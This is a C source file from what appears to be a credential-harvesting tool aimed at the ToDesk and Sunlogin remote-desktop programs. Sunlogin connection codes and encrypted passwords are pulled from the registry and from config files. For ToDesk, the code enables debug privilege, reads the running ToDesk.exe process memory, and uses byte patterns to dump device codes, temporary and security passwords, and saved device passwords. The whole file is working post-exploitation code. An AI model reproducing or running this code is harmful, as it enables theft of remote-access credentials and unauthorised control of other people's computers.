/*
 * Remote control tools: ToDesk / Sunlogin (向日葵)
 *
 * - Detection: service registry key + process + install path
 * - Sunlogin:  config extraction (fastcode/encry_pwd/sunlogincode) from
 *              registry + config INIs (SharpDecryptPwd approach)
 * - ToDesk:    live memory extraction of device code / temp password /
 *              security password / device list with passwords, by scanning
 *              the ToDesk.exe (--localPort) process for the canonical
 *              struct byte patterns (GhostWolf approach). x64 only.
 */
#include "remotecontrol.h"
#include "browser/utils.h"
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <wchar.h>
#include <windows.h>
#include <winreg.h>
#include <tlhelp32.h>

/* ================================================================
 * Shared helpers
 * ================================================================ */

static DWORD get_process_pid(const char* exe_name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) };
    DWORD pid = 0;
    if (Process32First(snapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, exe_name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &pe));
    }

    CloseHandle(snapshot);
    return pid;
}

/* Full image path of a running process (its exe on disk). Querying this is
 * cheap and avoids a full-drive recursive search when the target is running. */
static bool get_process_image_path(DWORD pid, const char* exe_name,
                                   char* out, int out_sz) {
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return false;
    char path[MAX_PATH];
    DWORD sz = (DWORD)sizeof(path);
    BOOL ok = QueryFullProcessImageNameA(h, 0, path, &sz);
    CloseHandle(h);
    if (!ok || sz == 0) return false;

    /* verify the image basename matches what we were looking for
     * (case-insensitive, ignoring a trailing ".exe" on either side) */
    const char* base = strrchr(path, '\\');
    base = base ? base + 1 : path;
    char base_buf[MAX_PATH];
    strncpy(base_buf, base, sizeof(base_buf) - 1);
    base_buf[sizeof(base_buf) - 1] = 0;
    char* bd = strrchr(base_buf, '.');
    if (bd) *bd = 0;
    char want_buf[MAX_PATH];
    strncpy(want_buf, exe_name, sizeof(want_buf) - 1);
    want_buf[sizeof(want_buf) - 1] = 0;
    char* wd = strrchr(want_buf, '.');
    if (wd) *wd = 0;
    if (_stricmp(base_buf, want_buf) != 0) return false;
    strncpy(out, path, (size_t)out_sz - 1);
    out[out_sz - 1] = 0;
    return true;
}

static bool is_installed(const char* reg_path) {
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, reg_path, 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

static void append_line(char* result, int* rp, int maxr, const char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    if (*rp < maxr - 8) *rp += vsnprintf(result + *rp, maxr - *rp, fmt, args);
    va_end(args);
}

/* Read an INI-style value: line starts with "<key>=" */
static bool ini_get_value(const char* text, const char* key, char* out, int out_sz) {
    const char* p = text;
    size_t kl = strlen(key);
    if (!text || !key || !out || out_sz <= 0) return false;
    out[0] = 0;
    while (*p) {
        const char* line = p;
        const char* nl = strchr(p, '\n');
        const char* eol = nl ? nl : p + strlen(p);
        size_t ll = (size_t)(eol - line);
        if (ll > kl && _strnicmp(line, key, kl) == 0 && line[kl] == '=') {
            const char* v = line + kl + 1;
            size_t vl = (size_t)(eol - v);
            while (vl > 0 && (v[vl-1] == '\r' || v[vl-1] == ' ')) vl--;
            if (vl >= (size_t)out_sz) vl = (size_t)out_sz - 1;
            memcpy(out, v, vl);
            out[vl] = 0;
            /* strip surrounding quotes */
            if (out[0] == '"' && vl >= 2 && out[vl-1] == '"') {
                memmove(out, out + 1, vl - 2);
                out[vl - 2] = 0;
            }
            return out[0] != 0;
        }
        p = nl ? nl + 1 : eol;
    }
    return false;
}

/* Read a file fully (caller frees); NULL if missing/oversized */
static char* read_text_file(const char* path, long max_size) {
    FILE* f;
    long sz;
    char* text;
    if (!path_exists(path)) return NULL;
    f = fopen(path, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0 || sz > max_size) { fclose(f); return NULL; }
    text = (char*)malloc(sz + 1);
    if (!text || fread(text, 1, sz, f) != (size_t)sz) { free(text); fclose(f); return NULL; }
    text[sz] = 0;
    fclose(f);
    return text;
}

/* ================================================================
 * Sunlogin — config extraction (SharpDecryptPwd approach)
 * ================================================================ */

static void sunlogin_report_ini(const char* path, const char* label, char* result, int* rp, int maxr) {
    char* text = read_text_file(path, 1024 * 1024);
    char fastcode[256] = {0}, encry_pwd[256] = {0}, sunlogincode[256] = {0};
    if (!text) return;

    ini_get_value(text, "fastcode", fastcode, sizeof(fastcode));
    ini_get_value(text, "encry_pwd", encry_pwd, sizeof(encry_pwd));
    ini_get_value(text, "sunlogincode", sunlogincode, sizeof(sunlogincode));
    free(text);

    if (!fastcode[0] && !encry_pwd[0] && !sunlogincode[0]) return;
    append_line(result, rp, maxr, "[%s] %s\n", label, path);
    if (fastcode[0])     append_line(result, rp, maxr, "  Fastcode: %s\n", fastcode);
    if (encry_pwd[0])    append_line(result, rp, maxr, "  Encry_pwd: %s\n", encry_pwd);
    if (sunlogincode[0]) append_line(result, rp, maxr, "  Sunlogincode: %s\n", sunlogincode);
}

static void sunlogin_report_reg_values(HKEY root, const char* path, const char* label,
                                       char* result, int* rp, int maxr) {
    HKEY hk;
    char fastcode[256] = {0}, encry_pwd[256] = {0}, sunlogincode[256] = {0};
    DWORD sz;
    if (RegOpenKeyExA(root, path, 0, KEY_READ, &hk) != ERROR_SUCCESS) return;

    sz = sizeof(fastcode);
    RegQueryValueExA(hk, "base_fastcode", NULL, NULL, (BYTE*)fastcode, &sz);
    sz = sizeof(encry_pwd);
    RegQueryValueExA(hk, "base_encry_pwd", NULL, NULL, (BYTE*)encry_pwd, &sz);
    sz = sizeof(sunlogincode);
    RegQueryValueExA(hk, "base_sunlogincode", NULL, NULL, (BYTE*)sunlogincode, &sz);
    RegCloseKey(hk);

    if (!fastcode[0] && !encry_pwd[0] && !sunlogincode[0]) return;
    append_line(result, rp, maxr, "[%s] HKU\\%s\n", label, path);
    if (fastcode[0])     append_line(result, rp, maxr, "  Fastcode: %s\n", fastcode);
    if (encry_pwd[0])    append_line(result, rp, maxr, "  Encry_pwd: %s\n", encry_pwd);
    if (sunlogincode[0]) append_line(result, rp, maxr, "  Sunlogincode: %s\n", sunlogincode);
}

static void sunlogin_scan_config(char* result, int* rp, int maxr) {
    HKEY hk;
    char install[MAX_PATH] = {0};
    DWORD sz = sizeof(install);
    char path[MAX_PATH];

    /* 1. Uninstall key -> InstallLocation -> config.ini */
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Oray SunLogin RemoteClient",
            0, KEY_READ, &hk) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hk, "InstallLocation", NULL, NULL, (BYTE*)install, &sz) == ERROR_SUCCESS && install[0]) {
            snprintf(path, sizeof(path), "%s\\config.ini", install);
            sunlogin_report_ini(path, "Sunlogin", result, rp, maxr);
        }
        RegCloseKey(hk);
    }

    /* 2. HKEY_USERS\.DEFAULT (system account) registry values */
    sunlogin_report_reg_values(HKEY_USERS,
        ".DEFAULT\\Software\\Oray\\SunLogin\\SunloginClient\\SunloginGreenInfo",
        "Sunlogin", result, rp, maxr);
    sunlogin_report_reg_values(HKEY_USERS,
        ".DEFAULT\\Software\\Oray\\SunLogin\\SunloginClient\\SunloginInfo",
        "Sunlogin", result, rp, maxr);

    /* 3. Common config INIs */
    sunlogin_report_ini("C:\\ProgramData\\Oray\\SunloginClient\\config.ini",
                        "Sunlogin", result, rp, maxr);
    {
        char appdata[MAX_PATH] = {0};
        GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata));
        if (appdata[0]) {
            snprintf(path, sizeof(path), "%s\\Oray\\SunloginClientLite\\sys_lite_config.ini", appdata);
            sunlogin_report_ini(path, "SunloginLite", result, rp, maxr);
        }
    }
    sunlogin_report_ini(
        "C:\\Windows\\system32\\config\\systemprofile\\AppData\\Roaming\\Oray\\SunloginClient\\sys_config.ini",
        "SunloginService", result, rp, maxr);
}

/* ================================================================
 * ToDesk — live memory extraction (GhostWolf approach, x64 only)
 * ================================================================ */
#ifdef _WIN64

typedef struct {
    uintptr_t p1;
    uintptr_t p2;
    unsigned char len;
    char padding_len[7];
    unsigned char maxlen;
    char padding_maxlen[7];
} TodeskString; /* 32 bytes */

#define TODESK_MAX_MATCHES 32
#define TODESK_MAX_STR     256

static const BYTE TODESK_PATTERN_NORMAL[] = {
    0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA, 0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,
    0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x0F,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA, 0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,
    0xAA,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0xAF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0x00,0x00, 0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0x00,0x00,
    0xAA,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0xAF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0x00,0x00, 0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0x00,0x00,
    0xAA,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0xAF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0x00,0x00, 0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0x00,0x00,
    0xAA,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0xAF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0x00,0x00, 0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0x00,0x00,
    0xAA,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0xAF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA, 0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,
    0xAA,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0xAF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA, 0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,
    0x0E,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x0F,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA, 0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,
    0x09,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x0F,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};

static const BYTE TODESK_PATTERN_PASS[] = {
    0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA, 0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,
    0xAA,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0xAF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF, 0xFF,0x00,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,
    0x09,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x0F,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF, 0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,
    0xAA,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x0F,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA, 0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,
    0xAA,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0xAF,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};

/* Wildcard compare: AA = any byte; AF = low nibble must be 0xF;
 * FF = byte must be 0x00 or 0x2E ('.') */
static bool todesk_pattern_match(const BYTE* data, const BYTE* pattern, size_t n) {
    size_t i;
    for (i = 0; i < n; i++) {
        if (pattern[i] == 0xAA) continue;
        if (pattern[i] == 0xAF && (data[i] & 0x0F) == 0x0F) continue;
        if (pattern[i] == 0xFF && (data[i] == 0x00 || data[i] == 0x2E)) continue;
        if (data[i] != pattern[i]) return false;
    }
    return true;
}

static bool todesk_enable_privilege(const char* name) {
    HANDLE token = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    bool ok = false;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) return false;
    if (LookupPrivilegeValueA(NULL, name, &luid)) {
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL);
        ok = (GetLastError() == ERROR_SUCCESS);
    }
    CloseHandle(token);
    return ok;
}

/* Find the main ToDesk UI process: its command line contains --localPort */
typedef LONG (NTAPI *NtQIP_t)(HANDLE, ULONG, void*, ULONG, ULONG*);
typedef struct {
    LONG ExitStatus;
    uintptr_t PebBaseAddress;
    ULONG_PTR AffinityMask;
    LONG BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PBI_t;

static HANDLE todesk_open_main_process(DWORD* out_pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) };
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    NtQIP_t NtQIP = ntdll ? (NtQIP_t)GetProcAddress(ntdll, "NtQueryInformationProcess") : NULL;
    HANDLE found = NULL;

    if (snap == INVALID_HANDLE_VALUE || !NtQIP) return NULL;

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "ToDesk.exe") != 0) continue;
            {
                HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID);
                if (h) {
                    PBI_t pbi;
                    ULONG ret = 0;
                    memset(&pbi, 0, sizeof(pbi));
                    if (NtQIP(h, 0 /*ProcessBasicInformation*/, &pbi, sizeof(pbi), &ret) == 0 && pbi.PebBaseAddress) {
                        uintptr_t params = 0;
                        /* UNICODE_STRING: USHORT len, max_len; pad; buffer */
                        struct { USHORT len; USHORT max_len; char pad[4]; uintptr_t buf; } cmd;
                        wchar_t wcmd[1024];
                        memset(&cmd, 0, sizeof(cmd));
                        memset(wcmd, 0, sizeof(wcmd));
                        /* x64: PEB->ProcessParameters at PEB+0x20;
                         * RTL_USER_PROCESS_PARAMETERS->CommandLine at +0x70 */
                        if (ReadProcessMemory(h, (LPCVOID)(pbi.PebBaseAddress + 0x20), &params, sizeof(params), NULL) && params &&
                            ReadProcessMemory(h, (LPCVOID)(params + 0x70), &cmd, sizeof(cmd), NULL) &&
                            cmd.buf && cmd.len > 0 && cmd.len < sizeof(wcmd) &&
                            ReadProcessMemory(h, (LPCVOID)cmd.buf, wcmd, cmd.len, NULL)) {
                            if (wcsstr(wcmd, L"--localPort")) {
                                if (found) CloseHandle(found);
                                found = h;
                                *out_pid = pe.th32ProcessID;
                                continue; /* h ownership moved to found */
                            }
                        }
                    }
                    CloseHandle(h);
                }
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

/* Read one TodeskString field. Short strings (<0x10) are inline at the
 * field's own address; longer ones are heap buffers pointed to by p1. */
static void todesk_read_string(HANDLE h, const TodeskString* s, uintptr_t field_addr,
                               char* out, int out_sz) {
    int len = s->len;
    uintptr_t src;
    int i;
    if (len <= 0 || len > TODESK_MAX_STR) { out[0] = 0; return; }
    src = (len < 0x10) ? field_addr : s->p1;
    if (!src) { out[0] = 0; return; }
    if (len >= out_sz) len = out_sz - 1;
    if (!ReadProcessMemory(h, (LPCVOID)src, out, (SIZE_T)len, NULL)) { out[0] = 0; return; }
    out[len] = 0;
    /* sanity: accept printable ASCII only */
    for (i = 0; i < len; i++) {
        unsigned char c = (unsigned char)out[i];
        if (c < 0x20 || c > 0x7e) { out[0] = 0; return; }
    }
}

static bool todesk_scan_pattern(HANDLE h, const BYTE* pattern, size_t pattern_size,
                                uintptr_t* matches, int max_matches, int* out_count) {
    SYSTEM_INFO si;
    uintptr_t addr;
    int count = 0;
    GetSystemInfo(&si);
    addr = (uintptr_t)si.lpMinimumApplicationAddress;
    while (addr < (uintptr_t)si.lpMaximumApplicationAddress) {
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQueryEx(h, (LPCVOID)addr, &mbi, sizeof(mbi)) != sizeof(mbi)) break;
        if (mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE &&
            (mbi.Protect & PAGE_READWRITE) != 0 && mbi.RegionSize <= (256u << 20)) {
            BYTE* buf = (BYTE*)malloc(mbi.RegionSize);
            if (buf) {
                SIZE_T got = 0;
                if (ReadProcessMemory(h, mbi.BaseAddress, buf, mbi.RegionSize, &got) && got > pattern_size) {
                    SIZE_T i;
                    uintptr_t base = (uintptr_t)mbi.BaseAddress;
                    for (i = 0; i + pattern_size <= got; i++) {
                        if (count >= max_matches) break;
                        if (todesk_pattern_match(buf + i, pattern, pattern_size)) {
                            matches[count++] = base + i;
                        }
                    }
                }
                free(buf);
            }
        }
        addr += mbi.RegionSize;
        if (count >= max_matches) break;
    }
    *out_count = count;
    return count > 0;
}

/* CanonicalTodesk: temp_pass@0x00, sec_pass@0x20, ..., update@0xE0, code@0x100 */
static void todesk_dump_main(HANDLE h, uintptr_t addr, char* result, int* rp, int maxr) {
    unsigned char buf[0x120];
    TodeskString* temp_pass = (TodeskString*)(buf + 0x00);
    TodeskString* sec_pass  = (TodeskString*)(buf + 0x20);
    TodeskString* upd_time  = (TodeskString*)(buf + 0xE0);
    TodeskString* code      = (TodeskString*)(buf + 0x100);
    char s1[TODESK_MAX_STR], s2[TODESK_MAX_STR], s3[TODESK_MAX_STR], s4[TODESK_MAX_STR];

    if (!ReadProcessMemory(h, (LPCVOID)addr, buf, sizeof(buf), NULL)) return;
    todesk_read_string(h, code, addr + 0x100, s1, sizeof(s1));
    todesk_read_string(h, temp_pass, addr + 0x00, s2, sizeof(s2));
    todesk_read_string(h, sec_pass, addr + 0x20, s3, sizeof(s3));
    todesk_read_string(h, upd_time, addr + 0xE0, s4, sizeof(s4));
    if (!s1[0] && !s2[0] && !s3[0]) return;
    append_line(result, rp, maxr, "  DeviceCode: %s\n", s1);
    if (s2[0]) append_line(result, rp, maxr, "  TempPassword: %s\n", s2);
    if (s3[0]) append_line(result, rp, maxr, "  SecurityPassword: %s\n", s3);
    if (s4[0]) append_line(result, rp, maxr, "  TempPasswordUpdated: %s\n", s4);
    append_line(result, rp, maxr, "\n");
}

/* CanonicalTodeskListWithPass: name@0x00, code@0x20, pass@0x40 */
static void todesk_dump_devpass(HANDLE h, uintptr_t addr, char* result, int* rp, int maxr) {
    unsigned char buf[0x60];
    TodeskString* name = (TodeskString*)(buf + 0x00);
    TodeskString* code = (TodeskString*)(buf + 0x20);
    TodeskString* pass = (TodeskString*)(buf + 0x40);
    char s1[TODESK_MAX_STR], s2[TODESK_MAX_STR], s3[TODESK_MAX_STR];

    if (!ReadProcessMemory(h, (LPCVOID)addr, buf, sizeof(buf), NULL)) return;
    todesk_read_string(h, name, addr + 0x00, s1, sizeof(s1));
    todesk_read_string(h, code, addr + 0x20, s2, sizeof(s2));
    todesk_read_string(h, pass, addr + 0x40, s3, sizeof(s3));
    if (!s2[0] && !s3[0]) return;
    append_line(result, rp, maxr, "  Device: %s | Code: %s | Password: %s\n",
                s1[0] ? s1 : "?", s2[0] ? s2 : "?", s3[0] ? s3 : "(none)");
}

static void todesk_memory_scan(char* result, int* rp, int maxr) {
    DWORD pid = 0;
    HANDLE h;
    uintptr_t matches[TODESK_MAX_MATCHES];
    int count, i;
    bool any = false;

    todesk_enable_privilege("SeDebugPrivilege");
    h = todesk_open_main_process(&pid);
    if (!h) {
        append_line(result, rp, maxr,
            "  ToDesk memory scan: ToDesk.exe (--localPort) process not found or not accessible.\n"
            "  (ToDesk must be running; run this tool elevated for other users' sessions.)\n");
        return;
    }

    append_line(result, rp, maxr, "  ToDesk process: PID %lu\n", (unsigned long)pid);

    if (todesk_scan_pattern(h, TODESK_PATTERN_NORMAL, sizeof(TODESK_PATTERN_NORMAL),
                            matches, TODESK_MAX_MATCHES, &count)) {
        append_line(result, rp, maxr, "  --- Main connection info (%d found) ---\n", count);
        for (i = 0; i < count; i++) todesk_dump_main(h, matches[i], result, rp, maxr);
        any = true;
    }

    if (todesk_scan_pattern(h, TODESK_PATTERN_PASS, sizeof(TODESK_PATTERN_PASS),
                            matches, TODESK_MAX_MATCHES, &count)) {
        append_line(result, rp, maxr, "  --- Device list with passwords (%d found) ---\n", count);
        for (i = 0; i < count; i++) todesk_dump_devpass(h, matches[i], result, rp, maxr);
        any = true;
    }

    CloseHandle(h);
    if (!any) append_line(result, rp, maxr, "  ToDesk patterns not found in memory (version mismatch?).\n");
}
#else
static void todesk_memory_scan(char* result, int* rp, int maxr) {
    (void)result; (void)rp; (void)maxr;
}
#endif /* _WIN64 */

/* ================================================================
 * Public entry
 * ================================================================ */

static const char* scan_remote_control(
    const char* display_name,
    const char* registry_key,
    const char* process_name) {
    static char result[4096];
    int pos = 0;
    DWORD pid = get_process_pid(process_name);
    bool installed = is_installed(registry_key);
    bool running = pid != 0;

    pos += snprintf(result + pos, sizeof(result) - pos,
                    "===== %s Information =====\n", display_name);

    if (!installed && !running) {
        pos += snprintf(result + pos, sizeof(result) - pos,
                        "Status: Not installed or running\n");
        return result;
    }

    const char* drives[] = {"C:\\", "D:\\", NULL};
    char found_path[MAX_PATH] = "";

    /* Fastest path: if the target is running, its image path IS the install
     * path. Zero-cost compared to a full-drive recursive search. */
    if (running && get_process_image_path(pid, process_name, found_path, sizeof(found_path))) {
        /* got it */
    }
    if (!found_path[0]) {
        /* Second fast path: service ImagePath usually points straight at the
         * exe — full-drive recursion is the last resort only. */
        {
            HKEY hKey;
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, registry_key, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                char image_path[MAX_PATH];
                DWORD size = sizeof(image_path);
                if (RegQueryValueExA(hKey, "ImagePath", NULL, NULL,
                                     (BYTE*)image_path, &size) == ERROR_SUCCESS && image_path[0]) {
                    char* p = image_path;
                    while (*p == ' ' || *p == '"') p++;
                    char exe[MAX_PATH];
                    strncpy(exe, p, sizeof(exe) - 1);
                    exe[sizeof(exe) - 1] = 0;
                    char orig[MAX_PATH];
                    strncpy(orig, exe, sizeof(orig) - 1);
                    orig[sizeof(orig) - 1] = 0;
                    char* q = strchr(exe, '"');
                    if (q) *q = 0;
                    /* Unquoted ImagePath with spaces: try the longest existing
                     * prefix first (rightmost space), falling back leftwards. */
                    char* sp_end = exe + strlen(exe);
                    while (sp_end > exe) {
                        DWORD a = GetFileAttributesA(exe);
                        if (a != INVALID_FILE_ATTRIBUTES && !(a & FILE_ATTRIBUTE_DIRECTORY)) {
                            strncpy(found_path, exe, sizeof(found_path) - 1);
                            break;
                        }
                        char* prev = strchr(exe, ' ');
                        char* last = NULL;
                        while (prev) { last = prev; prev = strchr(prev + 1, ' '); }
                        if (!last || last < exe) break;
                        *last = 0;
                        sp_end = last;
                    }
                    if (!found_path[0]) {
                        /* exe renamed/removed (e.g. AweSun renames
                         * SunloginClient.exe) — fall back to its directory so
                         * we at least record the install location instead of
                         * walking every drive. */
                        char* last_sep = strrchr(orig, '\\');
                        if (last_sep) {
                            *last_sep = 0;
                            DWORD a = GetFileAttributesA(orig);
                            if (a != INVALID_FILE_ATTRIBUTES && (a & FILE_ATTRIBUTE_DIRECTORY))
                                strncpy(found_path, orig, sizeof(found_path) - 1);
                        }
                    }
                }
                RegCloseKey(hKey);
            }
        }
    }

    if (!found_path[0]) {
        for (int di = 0; drives[di]; di++) {
            char* f = find_file_recursive(drives[di], process_name, 5);
            if (f) {
                strncpy(found_path, f, sizeof(found_path) - 1);
                free(f);
                break;
            }
        }
    }
    if (found_path[0]) {
        pos += snprintf(result + pos, sizeof(result) - pos,
                        "Found: %s\n", found_path);
    }

    {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, registry_key, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char image_path[MAX_PATH];
            DWORD size = sizeof(image_path);
            if (RegQueryValueExA(hKey, "ImagePath", NULL, NULL,
                                 (BYTE*)image_path, &size) == ERROR_SUCCESS) {
                pos += snprintf(result + pos, sizeof(result) - pos,
                                "ImagePath: %s\n", image_path);
            }
            RegCloseKey(hKey);
        }
    }

    pos += snprintf(result + pos, sizeof(result) - pos, "--- Running State ---\n");
    if (running) {
        pos += snprintf(result + pos, sizeof(result) - pos,
                        "Status: Running\nPID: %lu\n", (unsigned long)pid);
    } else {
        pos += snprintf(result + pos, sizeof(result) - pos,
                        "Status: Not running\n");
    }

    return result;
}

const char* remotecontrol_scan(const char* software_type) {
    if (strcmp(software_type, "todesk") == 0) {
        static char result[131072];
        int rp;
        result[0] = 0;
        strncpy(result, scan_remote_control(
                    "ToDesk Remote Control",
                    "SYSTEM\\CurrentControlSet\\Services\\ToDesk_Service",
                    "ToDesk.exe"),
                sizeof(result) - 1);
        result[sizeof(result) - 1] = 0;
        rp = (int)strlen(result);
        append_line(result, &rp, (int)sizeof(result), "--- Live Memory Extraction ---\n");
        todesk_memory_scan(result, &rp, (int)sizeof(result));
        return result;
    }
    if (strcmp(software_type, "sunlogin") == 0) {
        static char result[65536];
        int rp;
        result[0] = 0;
        strncpy(result, scan_remote_control(
                    "Sunlogin Remote Control",
                    "SYSTEM\\CurrentControlSet\\Services\\SunloginService",
                    "SunloginClient.exe"),
                sizeof(result) - 1);
        result[sizeof(result) - 1] = 0;
        rp = (int)strlen(result);
        append_line(result, &rp, (int)sizeof(result), "--- Config Extraction ---\n");
        sunlogin_scan_config(result, &rp, (int)sizeof(result));
        return result;
    }
    return NULL;
}
